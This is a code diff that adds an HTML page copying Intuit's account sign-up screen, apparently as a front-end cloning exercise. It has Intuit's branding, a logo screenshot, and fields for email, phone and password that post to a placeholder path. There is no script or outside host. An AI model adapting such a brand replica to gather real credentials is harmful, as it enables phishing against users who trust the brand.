@@ -1,3 +1,71 @@
-<form action="/my-handling-form-page" method="post">
+<!DOCTYPE html>
+<html lang="en">
 
-</form>
+<head>
+<link rel="stylesheet" href="style.css">
+<title>Intuit Account - Sign Up</title>
+
+</head>
+
+<body>
+    <header>
+            <div class="ius-hosted-ui-navigation-wrapper" style="height: 60px">
+                    <div class="ius-hosted-ui-navigation-container" style="">
+                      <div class="ius-hosted-ui-navigation-column">
+                        <div>Already have an Intuit account?</div>
+                        <a id="ius-hosted-ui-navigation-account-recovery-link" href="#">I forgot my User ID or Password</a>
+                      </div>
+                      <div class="ius-hosted-ui-navigation-column">
+                        <button id="ius-hosted-ui-navigation-sign-in-button" class="ius-btn ius-btn-submit">
+                          <span class="ius-white-lock-img"></span>
+                          Sign In
+                        </button>
+                      </div>
+                    </div>
+                  </div>
+
+    </header>
+    <section>
+            <div id="ius-hosted-ui-logo-container" class="ius-hosted-ui-logo-container">
+        
+                
+                    <img src="images/Screen Shot 2019-07-10 at 18.09.50.png" alt="intuit logo" >
+                            
+        </div>
+    </section>
+
+    <section>    
+        <h2>Create an Intuit account</h2>
+        <h4>One account for everything Intuit, including Mint. </h4>
+        <a href="https://accounts-help.lc.intuit.com/questions/1582580-creating-an-account" target="_blank" id="ius-sign-up-ecosystem-learn-more" class="ius-small-info-link">Learn&nbsp;more</a>
+
+        <form action="/where-data-will-be-sent" method="post">
+
+            <label id="ius-label-email" class="ius-label" for="ius-email">Email address</label>
+            <input id="ius-email" class="ius-text-input" placeholder="You'll verify this later" maxlength="100" type="email" aria-required="true" required="required" autocomplete="off" data-valid="valid">
+
+            <label id="ius-label-mobile-phone" class="ius-label" for="ius-mobile-phone">Phone <span class="ius-optional">(recommended)</span></label>
+            <input id="ius-mobile-phone" autocomplete="off" placeholder="Helps with lost passwords and security" type="tel" class="ius-text-input ius-intl-reset" maxlength="30" data-valid="valid">
+
+            <label id="ius-label-password" class="ius-label" for="ius-password">Password</label>
+            <input id="ius-password" autocomplete="new-password" class="ius-text-input" placeholder="​Don't reuse an old password" maxlength="50" type="password" aria-required="true" required="required" aria-describedby="ius_password_pwdStrengthIndicator ius-error-password">
+
+            <button id="ius-sign-up-submit-btn" class="ius-btn ius-btn-submit ius-btn-prominent" type="submit" name="SignUp" data-clicked-text="Creating ..." data-default-text="Create account">
+                <span id="ius-sign-up-submit-img" class="ius-white-lock-img"></span> <span id="ius-sign-up-submit-btn-text">Create account</span></button>
+
+
+        </form>
+
+    </section>
+
+
+<footer>
+
+
+</footer>
+
+</body>
+
+
+
+</html>
